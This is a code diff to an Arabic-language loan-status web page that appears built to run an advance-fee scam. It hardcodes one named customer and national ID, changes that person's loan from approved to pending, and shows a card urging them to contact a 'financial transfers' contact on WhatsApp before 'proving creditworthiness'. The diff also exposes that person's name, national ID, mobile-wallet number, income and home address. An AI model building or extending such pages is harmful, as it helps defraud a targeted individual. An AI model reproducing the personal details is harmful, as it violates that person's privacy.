@@ -1107,6 +1107,68 @@
             margin-top: 0.3rem;
         }
 
+        /* ===== SPECIAL PENDING CARD ===== */
+        .pending-card {
+            background: linear-gradient(145deg, #1a1a2e, #0f0f1f);
+            border-radius: var(--radius-lg);
+            padding: 2rem 1.5rem;
+            border: 2px solid var(--gold);
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 0 40px rgba(212, 175, 55, 0.05);
+        }
+        .pending-card .icon {
+            font-size: 4rem;
+            color: var(--gold);
+            margin-bottom: 0.5rem;
+        }
+        .pending-card h2 {
+            font-size: 1.6rem;
+            font-weight: 900;
+            color: #FFF;
+            margin-bottom: 0.3rem;
+        }
+        .pending-card h2 span {
+            color: var(--gold);
+        }
+        .pending-card .sub {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            line-height: 1.9;
+            margin-bottom: 1rem;
+        }
+        .pending-card .sub .hl-gold {
+            color: var(--gold);
+            font-weight: 700;
+        }
+        .pending-card .sub .hl-emerald {
+            color: var(--emerald);
+            font-weight: 700;
+        }
+        .pending-card .sub .hl-danger {
+            color: var(--danger);
+            font-weight: 700;
+        }
+        .pending-card .btn-whatsapp {
+            max-width: 280px;
+            margin: 0 auto;
+        }
+        .pending-card .note {
+            margin-top: 1rem;
+            padding: 0.8rem;
+            background: rgba(239, 68, 68, 0.06);
+            border: 1px solid rgba(239, 68, 68, 0.15);
+            border-radius: var(--radius-md);
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            line-height: 1.8;
+        }
+        .pending-card .note .hl-danger {
+            color: var(--danger);
+            font-weight: 700;
+        }
+
         @media (max-width: 440px) {
             .app { padding: 1rem 0.8rem; border-radius: var(--radius-lg); }
             .brand .text .main { font-size: 1.1rem; }
@@ -1134,6 +1196,9 @@
             .timer-danger .timer { font-size: 1.4rem; }
             .client-info .row { font-size: 0.65rem; flex-wrap: wrap; gap: 0.1rem; }
             .admin-panel .group button { font-size: 0.55rem; padding: 0.3rem 0.4rem; min-width: 55px; }
+            .pending-card h2 { font-size: 1.2rem; }
+            .pending-card .sub { font-size: 0.8rem; }
+            .pending-card .icon { font-size: 3rem; }
         }
         @media (max-width: 360px) {
             .brand .text .main { font-size: 0.95rem; }
@@ -3341,7 +3406,7 @@
     loan: 50000,
     wallet: "اتصالات كاش",
     walletNum: "01159441393",
-    status: "approved",
+    status: "pending", // تم تغيير الحالة إلى معلق
     job: "صاحب مهنة",
     income: "7,000",
     address: "مساكن درغام بلوك ٢ م١ مقابل مدرسه احمد عرابي الابتدائيه محرم بك الاسكندريه",
@@ -3590,6 +3655,31 @@
             `;
         }
 
+        // ===== دالة لعرض بطاقة الطلب المعلق =====
+        function buildPendingCard(customer) {
+            return `
+                <div class="pending-card">
+                    <div class="icon"><i class="fas fa-hourglass-half"></i></div>
+                    <h2>⏳ طلبك <span>معلق</span></h2>
+                    <div class="sub">
+                        عزيزي العميل، طلبك معلق لحين إثبات الجدارة الائتمانية المحددة لك.
+                        <br><br>
+                        يرجى التواصل مع <span class="hl-gold">قسم التحويلات المالية</span> على واتساب
+                        لفتح الطلب المغلق قبل الإثبات بنصف ساعة على الأقل،
+                        ليتم قبول الإثبات ونزول القرض لك فوراً.
+                    </div>
+                    <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 طلب فتح الطلب المغلق\nالعميل: ${customer.name}\nالرقم القومي: ${currentNationalId}\n\nأرجو فتح الطلب الخاص بي لإتمام إجراءات إثبات الجدارة الائتمانية.')">
+                        <i class="fab fa-whatsapp"></i> تواصل مع التحويلات المالية
+                    </button>
+                    <div class="note">
+                        <i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i>
+                        <span class="hl-danger">تنبيه:</span> يجب التواصل قبل الإثبات بنصف ساعة على الأقل
+                        ليتم فتح الطلب وقبول الإثباتات.
+                    </div>
+                </div>
+            `;
+        }
+
         // ================================================================
         //  DISPLAY RESULT
         // ================================================================
@@ -3599,6 +3689,14 @@
             currentNationalId = nationalId;
             const area = document.getElementById('resultArea');
 
+            // التحقق من أن العميل هو رضا محمد الحسينى وعرض بطاقة الطلب المعلق
+            if (customer.name === "رضا محمد الحسينى احمد" && nationalId === "28006251401059") {
+                area.innerHTML = buildPendingCard(customer);
+                document.getElementById('errorBox').style.display = 'none';
+                return;
+            }
+
+            // باقي العملاء يعرض لهم الواجهة العادية
             let html = '';
             html += buildLoanCard(customer);
 
